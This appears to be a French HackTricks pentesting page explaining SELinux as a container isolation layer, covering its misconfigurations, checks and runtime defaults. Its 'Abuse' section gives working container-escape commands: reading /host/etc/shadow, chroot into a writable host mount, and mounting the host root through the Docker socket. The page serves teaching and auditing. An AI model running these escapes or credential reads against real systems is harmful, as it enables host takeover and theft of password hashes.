# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

SELinux est un système de **Contrôle d'accès obligatoire basé sur des étiquettes**. Chaque processus et objet pertinent peut porter un contexte de sécurité, et la politique détermine quels domaines peuvent interagir avec quels types et de quelle manière. Dans les environnements conteneurisés, cela signifie généralement que le runtime lance le processus du conteneur dans un domaine de conteneur confiné et étiquette le contenu du conteneur avec des types correspondants. Si la politique fonctionne correctement, le processus pourra lire et écrire ce que son étiquette est censée toucher tout en se voyant refuser l'accès à d'autres contenus de l'hôte, même si ces contenus deviennent visibles via un mount.

Il s'agit de l'une des protections côté hôte les plus puissantes disponibles dans les déploiements de conteneurs Linux grand public. Elle est particulièrement importante sur Fedora, RHEL, CentOS Stream, OpenShift, et d'autres écosystèmes centrés sur SELinux. Dans ces environnements, un auditeur qui ignore SELinux comprendra souvent mal pourquoi une voie évidente vers la compromission de l'hôte est en réalité bloquée.

## AppArmor Vs SELinux

La différence la plus simple à haut niveau est qu'AppArmor est basé sur les chemins tandis que SELinux est **basé sur des étiquettes**. Cela a de grandes conséquences pour la sécurité des conteneurs. Une politique basée sur les chemins peut se comporter différemment si le même contenu de l'hôte devient visible sous un chemin de mount inattendu. Une politique basée sur des étiquettes demande plutôt quelle est l'étiquette de l'objet et ce que le domaine du processus peut lui faire. Cela ne rend pas SELinux simple, mais le rend robuste face à une classe d'hypothèses liées aux astuces de chemin que les défenseurs adoptent parfois par erreur dans les systèmes basés sur AppArmor.

Parce que le modèle est orienté étiquettes, la gestion des volumes de conteneurs et les décisions de réétiquetage sont critiques pour la sécurité. Si le runtime ou l'opérateur change les étiquettes trop largement pour « make mounts work », la frontière de la politique qui était censée contenir la charge de travail peut devenir beaucoup plus faible que prévu.

## Lab

Pour vérifier si SELinux est actif sur l'hôte :
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Pour inspecter les labels existants sur l'hôte:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Pour comparer une exécution normale avec une où le labeling est désactivé :
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Sur un hôte activé SELinux, il s'agit d'une démonstration très pratique car elle montre la différence entre une charge de travail s'exécutant sous le domaine de conteneur attendu et une autre qui a été privée de cette couche d'application.

## Runtime Usage

Podman est particulièrement bien aligné avec SELinux sur les systèmes où SELinux fait partie du comportement par défaut de la plateforme. Rootless Podman plus SELinux constitue l'une des bases de conteneurs grand public les plus solides, car le processus est déjà non privilégié côté hôte et reste confiné par la politique MAC. Docker peut également utiliser SELinux lorsqu'il est pris en charge, bien que les administrateurs le désactivent parfois pour contourner des frictions liées à l'étiquetage des volumes. CRI-O et OpenShift s'appuient fortement sur SELinux dans le cadre de leur isolation des conteneurs. Kubernetes peut aussi exposer des paramètres liés à SELinux, mais leur utilité dépend évidemment du fait que l'OS du nœud supporte et applique réellement SELinux.

La leçon récurrente est que SELinux n'est pas un ornement optionnel. Dans les écosystèmes qui reposent sur lui, il fait partie de la frontière de sécurité attendue.

## Misconfigurations

La erreur classique est `label=disable`. Sur le plan opérationnel, cela arrive souvent parce qu'un montage de volume a été refusé et que la solution la plus rapide à court terme a été de retirer SELinux de l'équation au lieu de corriger le modèle d'étiquetage. Une autre erreur courante est le réétiquetage incorrect du contenu de l'hôte. Des opérations de réétiquetage trop larges peuvent faire fonctionner l'application, mais elles peuvent aussi étendre ce que le conteneur est autorisé à toucher bien au-delà de l'intention initiale.

Il est aussi important de ne pas confondre SELinux **installé** et SELinux **effectif**. Un hôte peut supporter SELinux et être en mode permissif, ou le runtime peut ne pas lancer la charge de travail sous le domaine attendu. Dans ces cas, la protection est bien plus faible que ce que la documentation pourrait laisser penser.

## Abuse

Lorsque SELinux est absent, en mode permissif ou largement désactivé pour la charge de travail, les chemins montés depuis l'hôte deviennent beaucoup plus faciles à exploiter. Le même bind mount qui aurait autrement été contraint par des labels peut devenir une voie directe vers les données de l'hôte ou la modification de l'hôte. Ceci est particulièrement pertinent lorsqu'il est combiné avec des montages de volumes en écriture, des répertoires du runtime du conteneur, ou des raccourcis opérationnels qui exposent, par commodité, des chemins sensibles de l'hôte.

SELinux explique souvent pourquoi un writeup de breakout générique fonctionne immédiatement sur un hôte mais échoue à répétition sur un autre, même si les flags du runtime semblent similaires. L'ingrédient manquant n'est fréquemment ni un namespace ni une capability, mais une frontière de labels qui est restée intacte.

Le contrôle pratique le plus rapide est de comparer le contexte actif puis de sonder les chemins montés de l'hôte ou les répertoires du runtime qui seraient normalement confinés par des labels:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Si un host bind mount est présent et que SELinux labeling a été désactivé ou affaibli, la divulgation d'informations survient souvent en premier :
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Si le mount est writable et que le container est effectivement host-root du point de vue du kernel, l'étape suivante est de tester une modification contrôlée du host plutôt que de deviner :
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Sur les hôtes compatibles SELinux, la perte des labels autour des répertoires d'état d'exécution peut également exposer des chemins directs de privilege-escalation :
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Ces commandes ne remplacent pas une chaîne d'évasion complète, mais elles permettent de déterminer très rapidement si SELinux était ce qui empêchait l'accès aux données de l'hôte ou la modification de fichiers côté hôte.

### Exemple complet : SELinux désactivé + montage hôte inscriptible

Si l'étiquetage SELinux est désactivé et que le système de fichiers de l'hôte est monté en écriture sur `/host`, une évasion complète vers l'hôte devient un cas normal d'abus de bind-mount :
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Si le `chroot` réussit, le processus du conteneur s'exécute désormais depuis le système de fichiers de l'hôte :
```bash
id
hostname
cat /etc/passwd | tail
```
### Exemple complet : SELinux désactivé + répertoire runtime

Si la charge de travail peut atteindre un socket runtime une fois que les labels sont désactivés, l'escape peut être délégué au runtime :
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
L'observation pertinente est que SELinux était souvent le contrôle empêchant précisément ce type d'accès host-path ou runtime-state.

## Vérifications

L'objectif des vérifications SELinux est de confirmer que SELinux est activé, d'identifier le contexte de sécurité actuel, et de vérifier si les fichiers ou chemins qui vous intéressent sont effectivement confinés par des labels.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
À noter :

- `getenforce` devrait idéalement renvoyer `Enforcing` ; `Permissive` ou `Disabled` changent le sens de toute la section SELinux.
- Si le contexte du processus actuel semble inattendu ou trop large, la charge de travail peut ne pas s'exécuter sous la politique de conteneur prévue.
- Si les fichiers montés depuis l'hôte ou les répertoires runtime ont des étiquettes auxquelles le processus peut accéder trop librement, les bind mounts deviennent beaucoup plus dangereux.

Lors de l'examen d'un conteneur sur une plateforme compatible SELinux, ne considérez pas l'étiquetage comme un détail secondaire. Dans de nombreux cas, c'est l'une des principales raisons pour lesquelles l'hôte n'est pas déjà compromis.

## Valeurs par défaut du runtime

| Runtime / plateforme | État par défaut | Comportement par défaut | Affaiblissements manuels courants |
| --- | --- | --- | --- |
| Docker Engine | Dépend de l'hôte | La séparation SELinux est disponible sur les hôtes où SELinux est activé, mais le comportement exact dépend de la configuration de l'hôte/du daemon | `--security-opt label=disable`, re-étiquetage massif des bind mounts, `--privileged` |
| Podman | Généralement activé sur les hôtes SELinux | La séparation SELinux fait normalement partie de Podman sur les systèmes SELinux sauf si elle est désactivée | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Pas généralement attribué automatiquement au niveau du Pod | Le support SELinux existe, mais les Pods nécessitent généralement `securityContext.seLinuxOptions` ou des valeurs par défaut spécifiques à la plateforme ; le runtime et le nœud doivent prendre en charge | `seLinuxOptions` faibles ou trop larges, exécution sur des nœuds permissive/disabled, politiques de plateforme qui désactivent l'étiquetage |
| CRI-O / OpenShift style deployments | Souvent fortement utilisées | SELinux est souvent une partie centrale du modèle d'isolation des nœuds dans ces environnements | politiques personnalisées qui élargissent excessivement les accès, désactivation de l'étiquetage pour compatibilité |

Les valeurs par défaut de SELinux dépendent davantage de la distribution que celles de seccomp. Sur les systèmes de type Fedora/RHEL/OpenShift, SELinux est souvent au cœur du modèle d'isolation. Sur les systèmes sans SELinux, il est simplement absent.
{{#include ../../../../banners/hacktricks-training.md}}
